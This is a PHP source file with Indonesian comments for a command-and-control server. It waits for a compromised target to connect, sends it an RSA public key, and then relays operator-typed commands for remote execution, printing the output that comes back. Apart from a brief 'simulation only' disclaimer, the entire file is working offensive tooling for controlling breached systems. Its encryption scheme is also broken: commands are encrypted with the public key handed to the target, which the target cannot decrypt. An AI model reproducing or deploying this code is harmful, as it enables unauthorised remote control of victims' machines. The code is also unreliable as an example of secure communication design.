<?php
// Script PHP ini adalah server C2 (Command and Control) yang memungkinkan komunikasi jarak jauh
// dengan menggunakan enkripsi RSA untuk menjaga keamanan transmisi data antara server penyerang
// dan target. Perintah akan dienkripsi menggunakan RSA sebelum dikirimkan ke target.

// Penting: Script ini hanya untuk simulasi dan pengembangan. Penggunaan tanpa izin dapat
// menyebabkan konsekuensi hukum.

// Fungsi untuk menghasilkan pasangan kunci RSA (private key dan public key)
function generate_rsa_keys() {
    // Konfigurasi kunci RSA
    $config = array(
        "digest_alg" => "sha256", // Algoritma hash yang digunakan
        "private_key_bits" => 2048, // Panjang kunci dalam bit
        "private_key_type" => OPENSSL_KEYTYPE_RSA, // Jenis kunci (RSA)
    );

    // Membuat kunci baru
    $res = openssl_pkey_new($config);

    // Mengekspor private key ke dalam variabel
    openssl_pkey_export($res, $private_key);

    // Mendapatkan public key dari pasangan kunci
    $public_key = openssl_pkey_get_details($res)["key"];

    return array($private_key, $public_key); // Mengembalikan private dan public key
}

// Fungsi untuk mengenkripsi data menggunakan RSA dan public key
function rsa_encrypt($data, $public_key) {
    // Enkripsi data dengan public key
    openssl_public_encrypt($data, $encrypted_data, $public_key);
    return $encrypted_data; // Mengembalikan data terenkripsi
}

// Fungsi untuk mendekripsi data menggunakan RSA dan private key
function rsa_decrypt($data, $private_key) {
    // Dekripsi data dengan private key
    openssl_private_decrypt($data, $decrypted_data, $private_key);
    return $decrypted_data; // Mengembalikan data yang sudah didekripsi
}

// Fungsi untuk mengirim data yang sudah terenkripsi ke payload (target)
function send_to_payload($socket, $data, $public_key) {
    // Mengenkripsi data menggunakan public key
    $encrypted_data = rsa_encrypt($data, $public_key);

    // Mengirim data terenkripsi ke target melalui socket
    socket_write($socket, $encrypted_data, strlen($encrypted_data));
}

// Fungsi untuk menerima data terenkripsi dari payload dan mendekripsinya
function receive_from_payload($socket, $buffer_size, $private_key) {
    // Membaca data terenkripsi dari socket
    $encrypted_data = socket_read($socket, $buffer_size);

    // Mendekripsi data menggunakan private key
    return rsa_decrypt($encrypted_data, $private_key);
}

// Menampilkan banner informasi kepada pengguna
echo "\033[0;32m";
echo <<<BANNER

 ############################################################################################
# 1. Masukkan perintah secara langsung untuk dijalankan oleh sistem yang dikompromikan.    #
# 2. Perintah ditransmisikan dengan aman menggunakan enkripsi RSA.                         #
# CATATAN: Masukkan perintah yang ingin dieksekusi ketika diminta.                         #
 ###########################################################################################

BANNER;
echo "\033[0m\n"; 

// Meminta pengguna memasukkan IP server dan port C2
$attacker_ip = readline("[*] Masukkan IP server: ");
$c2_port = readline("[*] Masukkan port server C2: ");

// Membuat socket untuk komunikasi
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    echo "Gagal membuat socket: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

// Mengikat socket ke IP dan port yang dimasukkan
if (!socket_bind($socket, $attacker_ip, $c2_port)) {
    echo "Gagal mengikat socket: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

// Mendengarkan koneksi masuk
if (!socket_listen($socket, 5)) {
    echo "Gagal mendengarkan socket: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

echo "[*] Menunggu koneksi masuk...\n";

// Menerima koneksi dari client (target)
$client_socket = socket_accept($socket);
if ($client_socket === false) {
    echo "Gagal menerima koneksi: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

// Membuat pasangan kunci RSA
list($private_key, $public_key) = generate_rsa_keys();

// Mengirim public key ke client untuk enkripsi komunikasi
socket_write($client_socket, $public_key, strlen($public_key));

// Loop utama untuk menerima dan mengirim perintah
while (true) {
    // Meminta pengguna memasukkan perintah
    $command = readline("[*] Masukkan perintah yang akan dijalankan: ");

    // Mengirim perintah yang sudah terenkripsi ke target
    send_to_payload($client_socket, $command, $public_key);

    // Keluar dari loop jika perintah adalah 'exit'
    if (trim($command) == 'exit') {
        echo "Keluar...\n";
        break;
    }

    // Menerima output dari target dan mendekripsinya
    $output = receive_from_payload($client_socket, 4096, $private_key);

    // Menampilkan output perintah
    echo "[*] Output Perintah:\n$output\n";

    // Menunggu sebelum menerima perintah berikutnya
    sleep(10);
}

// Menutup socket
socket_close($client_socket);
socket_close($socket);

?>
